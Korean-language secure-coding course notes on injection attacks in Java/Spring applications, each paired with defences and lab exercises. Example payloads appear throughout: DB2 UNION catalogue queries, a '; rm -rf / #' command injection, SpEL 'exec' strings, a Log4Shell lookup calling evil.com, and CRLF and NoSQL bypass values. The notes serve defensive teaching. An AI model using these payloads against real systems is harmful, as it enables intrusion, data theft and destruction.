# Day 1 (2/2) — Injection 심화

> "데이터가 코드로 해석되는 모든 곳"이 인젝션 후보. 패턴은 같고 대상이 다를 뿐.

## 1. SQL Injection 심화 (Week 1 Lab 2 이후)

### 1.1 분류

| 종류 | 특징 | 탐지 도구 |
|------|------|---------|
| **In-band (Classic)** | 응답에 결과 노출 | 눈으로 |
| **Error-based** | DB 에러 메시지로 정보 추출 | 1/0, CAST 오류 |
| **UNION-based** | UNION SELECT로 결과 합치기 | column 개수 매핑 |
| **Blind - Boolean** | 응답의 참/거짓으로 한 비트씩 | sqlmap |
| **Blind - Time** | `SLEEP()`로 시간 차이 측정 | 응답 시간 모니터링 |
| **Out-of-band** | DNS·HTTP 쿼리로 결과 전송 | Burp Collaborator |
| **Second-order** | 저장된 값이 나중 쿼리에서 실행 | 코드 리뷰 |

### 1.2 Second-Order SQLi (놓치기 쉬움)
```java
// 회원 가입 시 — 바인딩 사용 (안전해 보임)
String sql1 = "INSERT INTO users(username) VALUES(?)";
// username = "admin'--"  ← 값으로만 저장됨

// 이후 다른 곳에서
String username = userRepo.findById(id).getUsername();
String sql2 = "SELECT * FROM logs WHERE user='" + username + "'";  // ❌ 여기서 터짐
```
저장 시점 안전 ≠ 사용 시점 안전. **신뢰 경계는 데이터의 생애주기 내내 유지** 안 됨.

### 1.3 DB2 특화 (사용자 환경)

DB2-specific 함수·페이로드:
```sql
-- DB2 버전 확인
' UNION SELECT 1, SERVICE_LEVEL FROM SYSIBMADM.ENV_INST_INFO --

-- 테이블 목록
' UNION SELECT TABNAME, TABSCHEMA, '', '' FROM SYSCAT.TABLES WHERE TABSCHEMA NOT IN ('SYSIBM') --

-- 시간 기반 blind
' AND (SELECT COUNT(*) FROM SYSIBM.SYSDUMMY1 WHERE DBMS_LOB.SUBSTR(...) ...) --
```

DB2에서 자주 노출되는 정보 스키마: `SYSCAT.*`, `SYSIBM.*`, `SYSIBMADM.*`. 앱 사용자가 이런 시스템 카탈로그를 SELECT 할 수 있다면 위험.

### 1.4 MyBatis 패턴 (실제 코드에서 가장 흔함)

```xml
<!-- ✅ 안전 -->
<select id="findById">
  SELECT * FROM users WHERE id = #{id}
</select>

<!-- ⚠ ${} 는 문자열 치환이라 위험. 동적 컬럼만 부득이하게 사용 -->
<select id="findByOrder">
  SELECT * FROM users ORDER BY ${sortColumn}  <!-- 화이트리스트 검증 필수 -->
</select>

<!-- ❌ 최악 — 사용자 입력을 ${} 로 -->
<select id="search">
  SELECT * FROM users WHERE name LIKE '%${name}%'
</select>
<!-- 공격: name = "' UNION SELECT ... --" -->
```

### 1.5 LIKE 검색의 함정
```java
// 사용자 입력에 %, _ 가 그대로 들어가면 의도치 않은 매칭
String pattern = "%" + userInput + "%";
// 입력이 "%" 만 들어가면 → 전부 매칭
// 입력이 "_" 면 1글자 매칭

// 안전: % _ \ escape
String escaped = userInput.replace("\\", "\\\\")
                          .replace("%", "\\%")
                          .replace("_", "\\_");
// JPQL: ESCAPE '\'
```

```sql
-- DB2 ESCAPE 절
SELECT * FROM users WHERE name LIKE '%foo\%bar%' ESCAPE '\'
```

---

## 2. NoSQL Injection

MongoDB, Elasticsearch 등에도 인젝션이 있다.

```javascript
// Express + MongoDB 예 (참고)
db.users.find({username: req.body.user, password: req.body.pass})
// 공격: { user: "admin", pass: {"$ne": null} }
// → password가 null이 아닌 모든 사용자 매칭 → 로그인 우회
```

Java + MongoDB는 BSON 객체 빌더 사용 시 비교적 안전하지만, JSON을 직접 파싱해서 쿼리에 넣으면 같은 문제 발생.

---

## 3. OS Command Injection

```java
// ❌ 매우 위험
String filename = request.getParameter("file");
Runtime.getRuntime().exec("convert " + filename + " out.pdf");
// 공격: file = "; rm -rf / #"
```

### 방어
```java
// ✅ 1. 명령 인자를 배열로 (셸 해석 안 됨)
new ProcessBuilder("convert", filename, "out.pdf").start();

// ✅ 2. 파일명은 화이트리스트·정규식 검증
if (!filename.matches("^[a-zA-Z0-9._-]+$")) throw new IllegalArgumentException();

// ✅ 3. 가능하면 시스템 명령 호출 자체를 안 함 (라이브러리 사용)
```

**원칙**: `exec("문자열")` 형태 절대 금지. 배열 형태(`ProcessBuilder`, `exec(String[])`)는 셸을 거치지 않아 메타문자가 무력화.

---

## 4. LDAP Injection

LDAP 쿼리에 사용자 입력 직접 삽입:
```java
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
// 공격: username = "*)(uid=*))(|(uid=*", password = "anything"
```

방어: `javax.naming.ldap.LdapName` 사용, 검색 필터 escape:
```java
String safeUser = encodeForLDAP(username);  // OWASP ESAPI
```

---

## 5. XPath Injection
XML 데이터를 XPath로 조회하는 코드. 동일 패턴.
```java
"//user[username/text()='" + name + "' and password/text()='" + pw + "']"
// 공격: name = "' or '1'='1"
```
방어: XPath 변수 바인딩 (`XPathExpression.setXPathVariableResolver`).

---

## 6. SSTI (Server-Side Template Injection) — Thymeleaf 특화 ⚠

**가장 흔히 간과되는 인젝션 중 하나.** Thymeleaf의 SpEL(Spring Expression Language)이 사용자 입력으로 평가되면 **RCE**.

### 6.1 위험 패턴

```java
// ❌ 컨트롤러에서 사용자 입력을 그대로 뷰 이름으로
@GetMapping("/page")
public String page(@RequestParam String name) {
    return "fragments/" + name;
}
```
공격: `name = ../../template?injection`로 임의 템플릿 평가 유도 가능. (Spring4Shell, CVE-2022-22965와는 다르지만 비슷한 류)

```html
<!-- ❌ 페이지 안에 사용자 입력을 표현식 컨텍스트로 -->
<div th:text="${userInput}">...</div>          <!-- 이건 안전 (이스케이프됨) -->
<div th:utext="${userInput}">...</div>          <!-- 위험: HTML 그대로 -->
<div th:with="x=${T(java.lang.Runtime).getRuntime().exec(userInput)}">...</div>  <!-- 절대 X -->
```

### 6.2 실제 CVE 사례
**CVE-2022-22965 (Spring4Shell)**: Spring `DataBinder`로 ClassLoader 조작 → 임의 파일 작성 → RCE. 직접 SSTI는 아니지만 표현식·바인더 결합 결함.

**CVE-2023-38286 (Thymeleaf)**: `org.thymeleaf.standard.expression`이 일부 컨텍스트에서 SpEL을 평가하는 결함.

### 6.3 안전한 Thymeleaf 사용 원칙
1. `th:text` 만 쓰고 `th:utext`는 **거의 절대 안 쓴다**
2. 뷰 이름(`return "..."`)에 사용자 입력 절대 포함 X
3. 템플릿 안에서 사용자 입력을 표현식 컨텍스트(`${...}`)에 넣지 않는다
4. 사용자 입력은 항상 **컨트롤러에서 Model attribute로** 전달, 템플릿은 표시만
5. fragments 동적 선택 시 화이트리스트:
   ```html
   <div th:replace="~{fragments/__${name}__}"></div>  <!-- ❌ -->
   ```
   ```java
   private static final Set<String> ALLOWED = Set.of("header", "footer", "menu");
   ```

### 6.4 SSTI 페이로드 (탐지용, 본인 앱에만!)
공격자가 SSTI 가능성을 탐지하는 페이로드:
- `${7*7}` → 49가 렌더링되면 표현식 평가됨
- `${T(java.lang.Runtime)}` → 클래스 객체가 보이면 RCE 직전
- `*{7*7}`, `#{7*7}` (다른 표현식 종류)

---

## 7. SpEL Injection (Spring Expression Language)

Spring에서 SpEL이 사용자 입력으로 평가되면 RCE.

```java
// ❌ SpEL을 사용자 입력으로 evaluate
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);
exp.getValue();
// 공격: userInput = "T(java.lang.Runtime).getRuntime().exec('calc')"
```

`@Value("#{...}")`, `@PreAuthorize("...")`, 등에 외부 입력이 흘러들어가지 않는지 확인.

---

## 8. JNDI Injection — Log4Shell (CVE-2021-44228)

2021년 인터넷을 뒤흔든 사건. Log4j2가 로그 메시지 안의 `${jndi:ldap://...}`를 평가하면서 외부 LDAP/RMI로 클래스 로드 → RCE.

```java
log.info("User-Agent: {}", userAgent);  // 평범해 보임
// 공격: User-Agent: ${jndi:ldap://evil.com/a}
```

**방어**:
- Log4j2 2.17.1+ 또는 logback 사용
- JVM 옵션 `-Dlog4j2.formatMsgNoLookups=true` (구버전 미티게이션)
- 외부 LDAP 호출 차단 (egress 방화벽)

**교훈**: 로그 라이브러리 같은 "안전해 보이는" 컴포넌트가 가장 위험할 수 있다. 의존성 모두를 잠재적 공격 표면으로 본다.

---

## 9. HTTP Header Injection / CRLF Injection

응답 헤더에 사용자 입력을 그대로:
```java
response.setHeader("X-Result", userInput);
// 공격: userInput = "value\r\nSet-Cookie: admin=true"
```
→ 임의 헤더 주입, 세션 고정, XSS 가능.

Spring은 일반적으로 CRLF를 거부하지만, 커스텀 응답 작성 시 주의. 항상 `\r`, `\n` 제거.

---

## 10. Mass Assignment (DTO 인젝션)

`@ModelAttribute`로 객체 바인딩 시 의도치 않은 필드 변경.

```java
public class UserForm {
    private String username;
    private String email;
    private boolean admin;  // ❌ 폼에 있으면 안 됨
}

@PostMapping("/profile")
public String update(@ModelAttribute UserForm form) {
    // 사용자가 POST 시 admin=true 추가 → 권한 상승
}
```

**방어**:
- DTO는 폼에 노출할 필드만
- `@InitBinder`로 허용 필드 화이트리스트:
  ```java
  @InitBinder
  public void initBinder(WebDataBinder binder) {
      binder.setAllowedFields("username", "email");
      // 또는 setDisallowedFields("admin", "role")
  }
  ```
- Entity ≠ Form/DTO. 변환 계층 두기.

> **Spring4Shell의 핵심**도 mass assignment 결함이었다. ClassLoader 같은 위험 필드를 바인딩 가능했음.

---

## 11. 실습

### 실습 2.1 — `vulnerable_app`의 검색 SQLi
- `/vuln/search?q=...` 에 UNION으로 사용자 목록 추출
- `/safe/search`로 패치 후 동일 공격 차단 확인

### 실습 2.2 — OS Command Injection
- `/vuln/ping?host=...` 에 `; whoami` 주입
- `/safe/ping` 패치 후 차단 확인

### 실습 2.3 — Thymeleaf SSTI 탐지
- 본인 회사 코드에서 다음 패턴 grep:
  ```
  grep -rn 'th:utext' src/
  grep -rn 'return "[^"]*+.*"' src/main/java/  # 동적 뷰 이름
  grep -rn 'parseExpression' src/main/java/    # SpEL
  ```

### 실습 2.4 — Mass Assignment 점검
- `@ModelAttribute` 또는 `@RequestBody`로 받는 모든 DTO 확인
- Entity를 직접 받는 곳이 있는지 — 있으면 즉시 DTO 분리

---

## 정리 — 인젝션 방어의 공통 원칙

1. **데이터와 코드 분리**: 사용자 입력은 항상 "데이터"로만 다룬다. Prepared statement, 인자 배열, 템플릿 변수.
2. **출력 컨텍스트별 인코딩**: SQL은 바인딩, HTML은 HTML escape, JS는 JS escape, URL은 URL encode.
3. **화이트리스트 검증**: 가능한 모든 값을 미리 알 수 있으면 화이트리스트로 검증.
4. **최소 권한**: 인젝션이 성공해도 영향이 작게. DB 권한 분리, 컨테이너 권한.
5. **라이브러리 신뢰 X**: Log4Shell처럼 안전해 보이는 곳도 의심. 의존성 스캐닝 필수.
